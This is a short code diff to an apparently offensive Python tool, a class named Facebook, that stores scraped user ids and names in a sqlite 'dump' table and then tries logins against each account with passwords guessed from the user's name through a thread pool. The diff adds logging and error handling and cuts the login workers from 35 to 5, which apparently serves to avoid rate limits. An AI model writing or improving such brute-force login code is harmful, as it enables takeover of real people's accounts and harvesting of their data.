@@ -27,8 +27,14 @@ class Facebook:
                     try:
                         db.cursor().execute('INSERT INTO dump (id, name) VALUES (?,?)', (i_['id'], i_['name']))
                         db.commit()
+                        print(f'[ INFO! ] User ={i_["id"]}({i_["name"]}) successfull add to the database.')
                     except sqlite3.IntegrityError:
                         pass
+                    except Exception as e:
+                        pass
+                        
+                db.close()
+
 
             return a__i_['paging']['next'].replace('&limit=25','')
             
@@ -108,7 +114,7 @@ class Facebook:
                 id, name = i_[0], i_[1]
                 password = self.__password(name=name)
 
-                with t__pe_(max_workers=35) as t__:
+                with t__pe_(max_workers=5) as t__:
                     for x_ in password:
                         c__rk_ = t__.submit(self.__login_method, id, x_)
                         
